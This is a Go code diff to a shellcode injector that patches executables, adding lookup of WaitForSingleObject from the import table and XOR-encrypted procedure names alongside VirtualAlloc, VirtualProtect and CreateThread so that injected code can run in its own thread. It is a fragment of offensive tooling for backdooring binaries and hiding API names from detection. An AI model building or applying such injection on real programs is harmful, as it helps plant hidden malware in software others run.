@@ -82,29 +82,34 @@ type loaderCtx struct {
 	Args map[string]interface{}
 
 	// store procedure status
-	LackProcedure      bool
-	LackVirtualAlloc   bool
-	LackVirtualProtect bool
-	LackCreateThread   bool
-	LoadLibraryWOnly   bool
-	NeedCreateThread   bool
+	LackProcedure           bool
+	LackVirtualAlloc        bool
+	LackVirtualProtect      bool
+	LackCreateThread        bool
+	LackWaitForSingleObject bool
+	LoadLibraryWOnly        bool
+	NeedCreateThread        bool
+	NeedWaitThread          bool
 
 	// encrypt procedure name with xor
-	Kernel32DLLDB     []int64
-	Kernel32DLLKey    []int64
-	VirtualAllocDB    []int64
-	VirtualAllocKey   []int64
-	VirtualProtectDB  []int64
-	VirtualProtectKey []int64
-	CreateThreadDB    []int64
-	CreateThreadKey   []int64
+	Kernel32DLLDB          []int64
+	Kernel32DLLKey         []int64
+	VirtualAllocDB         []int64
+	VirtualAllocKey        []int64
+	VirtualProtectDB       []int64
+	VirtualProtectKey      []int64
+	CreateThreadDB         []int64
+	CreateThreadKey        []int64
+	WaitForSingleObjectDB  []int64
+	WaitForSingleObjectKey []int64
 
 	// store procedure IAT offset
-	LoadLibrary    uint64
-	GetProcAddress uint64
-	VirtualAlloc   uint64
-	VirtualProtect uint64
-	CreateThread   uint64
+	LoadLibrary         uint64
+	GetProcAddress      uint64
+	VirtualAlloc        uint64
+	VirtualProtect      uint64
+	CreateThread        uint64
+	WaitForSingleObject uint64
 
 	// information of write shellcode
 	CodeCave        bool
@@ -317,6 +322,7 @@ func (inj *Injector) findProcFromIAT(ctx *loaderCtx) error {
 	VirtualAlloc := inj.getProcFromIAT("VirtualAlloc")
 	VirtualProtect := inj.getProcFromIAT("VirtualProtect")
 	CreateThread := inj.getProcFromIAT("CreateThread")
+	WaitForSingleObject := inj.getProcFromIAT("WaitForSingleObject")
 	var lackProcedure bool
 	if VirtualAlloc != nil {
 		ctx.VirtualAlloc = VirtualAlloc.addr
@@ -338,6 +344,15 @@ func (inj *Injector) findProcFromIAT(ctx *loaderCtx) error {
 			lackProcedure = true
 		}
 		ctx.NeedCreateThread = true
+		if !inj.opts.NotWaitThread {
+			if WaitForSingleObject != nil {
+				ctx.WaitForSingleObject = WaitForSingleObject.addr
+			} else {
+				ctx.LackWaitForSingleObject = true
+				lackProcedure = true
+			}
+			ctx.NeedWaitThread = true
+		}
 	}
 	ctx.LackProcedure = lackProcedure
 	if !lackProcedure {
@@ -377,6 +392,7 @@ func (inj *Injector) encryptStrings(ctx *loaderCtx) {
 	ctx.VirtualAllocDB, ctx.VirtualAllocKey = inj.encryptString("VirtualAlloc", false)
 	ctx.VirtualProtectDB, ctx.VirtualProtectKey = inj.encryptString("VirtualProtect", false)
 	ctx.CreateThreadDB, ctx.CreateThreadKey = inj.encryptString("CreateThread", false)
+	ctx.WaitForSingleObjectDB, ctx.WaitForSingleObjectKey = inj.encryptString("WaitForSingleObject", false)
 }
 
 func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) {
